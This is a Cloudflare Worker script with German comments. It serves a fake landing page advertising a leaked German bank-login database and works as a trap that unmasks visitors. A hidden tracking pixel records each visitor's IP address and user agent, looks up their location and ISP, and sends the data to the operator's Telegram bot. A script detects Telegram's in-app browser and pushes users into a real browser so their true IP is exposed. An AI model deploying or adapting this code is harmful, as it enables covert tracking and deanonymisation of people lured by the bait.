export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE LANDING PAGE ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const html = `
      <!DOCTYPE html>
      <html lang="de">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
          <style>
              body { background-color: #0a0a0a; color: #cccccc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; padding: 20px; }
              .container { max-width: 600px; margin: 20px auto; background: #111; border: 1px solid #222; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
              h1 { color: #ffffff; font-size: 18px; border-bottom: 1px solid #333; padding-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
              .meta { font-size: 12px; color: #777; margin-bottom: 30px; display: flex; flex-wrap: wrap; gap: 10px; }
              .btn { display: block; width: 100%; padding: 18px; background-color: #e0e0e0; color: #000; text-align: center; text-decoration: none; font-weight: bold; font-size: 15px; text-transform: uppercase; border: none; cursor: pointer; box-sizing: border-box; border-radius: 4px; }
              .btn:hover { background-color: #ffffff; }
              .footer { margin-top: 30px; font-size: 11px; color: #444; text-align: center; text-transform: uppercase; }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>dumps11-02-2026 (Bank Login database Deutschland)</h1>
              
              <div class="meta">
                  <span>Format: CSV</span>
                  <span>Rows: 4,829,102</span>
                  <span>Size: 1.2 GB</span>
                  <span>Status: Unencrypted</span>
              </div>

              <!-- 1. TRACKER FEUERT BEIM LADEN (Egal wo) -->
              <img src="/pixel?c=load_${url.searchParams.get('c') || 'default'}" style="display:none;" />

              <!-- 2. BUTTON: Erzwingt das Öffnen im echten Browser durch einen speziellen Link -->
              <a href="https://watcher.rthvzkr6jv.workers.dev/?open=true&c=${url.searchParams.get('c') || 'default'}" class="btn">Open in Browser to login</a>

              <div class="footer">
                  Secure Gateway | Protocol 443
              </div>
          </div>
          
          <script>
            // Kleiner Trick: Wenn wir im echten Browser sind (nicht Telegram), zeigen wir den normalen Button
            // Wenn wir in Telegram sind, zwingen wir Safari zum Öffnen.
            if (navigator.userAgent.includes("Telegram")) {
                document.querySelector('.btn').innerText = "Open in Browser to login";
                document.querySelector('.btn').href = window.location.href + "?open=true";
            } else {
                document.querySelector('.btn').innerText = "Database entschlüsseln";
                document.querySelector('.btn').href = "https://t.me/dein_telegram_username";
            }
          </script>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER ---
    if (url.pathname === "/pixel") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toISOString();

      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt";
      
      try {
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        if (data.success) {
          loc = `${data.city || '?'}, ${data.country || '?'}`;
          isp = data.connection?.isp || "?";
          asn = `AS${data.connection?.asn || '?'}`;
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        // Unterscheidung für den Bot: Ist es Telegram oder ein echter Browser?
        const isTelegram = ua.includes("Telegram");
        const source = isTelegram ? "TELEGRAM (Unnütz)" : "BROWSER (Echte IP)";
        
        const msg = 
          `Quelle: ${source}\n` +
          `Tag: ${tag}\n` +
          `IP: ${ip}\n` +
          `Ort: ${loc}\n` +
          `Provider: ${isp}\n` +
          `ASN: ${asn}\n` +
          `Zeit: ${t}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
      return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
    }

    return new Response("404", { status: 404 });
  }
};
